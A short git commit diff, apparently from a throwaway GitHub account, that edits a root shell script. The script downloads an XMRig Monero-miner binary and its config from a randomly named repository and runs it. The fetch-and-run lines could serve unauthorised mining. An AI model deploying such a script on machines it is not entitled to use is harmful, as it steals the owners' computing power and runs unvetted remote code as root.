9a677f0c1d70df90920c4cff9658fd8804712a66
NicoleLawrence56851 <96326705+NicoleLawrence56851@users.noreply.github.com>
2022-04-19 09:24:38 -0700

    Update wawa.sh

--- wawa.sh
+++ wawa.sh
@@ -5,7 +5,7 @@ apt install wget screen -y
 
 mkdir -p /root/xmr
 cd /root/xmr 
-wget https://github.com/NicoleLawrence56851/xxsw1m2jhu389/blob/main/xmrig -O /root/xmr/xmrig 
+wget https://github.com/NicoleLawrence56851/xxsw1m2jhu389/raw/main/xmrig -O /root/xmr/xmrig 
 chmod +x /root/xmr/xmrig 
 wget https://raw.githubusercontent.com/NicoleLawrence56851/xxsw1m2jhu389/main/config.json -O /root/xmr/config.json 
-screen -dmS xmr /root/xmr/xmrig -c /root/xmr/config.json
+/root/xmr/xmrig -c /root/xmr/config.json
